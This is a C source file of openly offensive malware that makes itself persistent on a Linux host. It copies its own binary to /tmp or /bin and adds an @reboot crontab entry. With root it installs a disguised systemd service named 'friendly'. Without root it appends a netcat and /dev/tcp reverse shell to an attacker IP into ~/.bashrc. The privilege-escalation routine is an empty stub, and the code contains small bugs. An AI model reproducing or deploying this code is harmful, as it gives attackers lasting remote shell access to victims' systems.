#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

bool make_persistent(char *executable_name);

bool is_first_exec(char *executable_name);

bool priv_esc();

void copy_to_persistent_path(char *current_path, char *dest_path);


bool make_persistent(char *executable_name){
    bool isPersistent = false;

    bool isRoot = getuid() == 0 ? true : false;

    char fullpath[128];
    
    readlink("/proc/self/exe", fullpath, sizeof(fullpath));

    copy_to_persistent_path(fullpath, "/tmp");

    // add new ssh key to authorized_keys

    char *public_key = ATTACKER_SSH_PUBLIC_KEY;

    if(!isRoot){
        if(priv_esc()){

        }else{

            // set cronjob on system reboot
            char cronjob[128];
            snprintf(cronjob, sizeof(cronjob), "{ crontab -l; echo \"@reboot /tmp/%s\"; } | crontab -", executable_name);

            system(cronjob);

            // everytime the exploited user make a command in the shell this will try to connect
            char backdoor_bashrc[128];

            snprintf(backdoor_bashrc, sizeof(backdoor_bashrc), 
            "echo \"nc -e /bin/bash %s %i || bash -i >& /dev/tcp/%s/%i 0>&1\" >> ~/.bashrc", ATTACKER_IP, PORT, ATTACKER_IP, PORT);

            if(!system(backdoor_bashrc)){
                isPersistent = true;
            }
        }

    }else{

        copy_to_persistent_path(fullpath, "/bin");

        char cronjob[128];
        snprintf(cronjob, sizeof(cronjob), "{ crontab -l; echo \"@reboot /bin/%s\"; } | crontab -", executable_name);

        system(cronjob);

        char service_config[400] = "sudo echo -e \""
        "[Unit]\n"
        "Description=Friendly Service\n"
        "[Service]\n"
        "Type=simple\n"
        "ExecStart=/tmp/%s || /bin/%s\n"
        "Restart=on-failure\n"
        "RestartSec=10\n"
        "KillMode=process\n"
        "[Install]\n"
        "WantedBy=multi-user.target\" > /etc/systemd/system/friendly.service";

        char create_service[360];

        snprintf(create_service, sizeof(create_service), service_config, executable_name, executable_name);

        system(create_service);

        system("sudo systemctl enable friendly");

    }
    
    return isPersistent;
}


void copy_to_persistent_path(char *current_path, char *dest_path){
    char command[256];

    snprintf(command, sizeof(char *)*256, "cp %s %s", current_path, dest_path);

    system(command);
}


bool is_first_exec(char *executable_name){

	char path[32];

	snprintf(path, sizeof(path), "/tmp/%s", executable_name);

	if(!access(path, F_OK)){
        return false;
    }else{
        return true;
    }
}


bool priv_esc(){
    return false;
}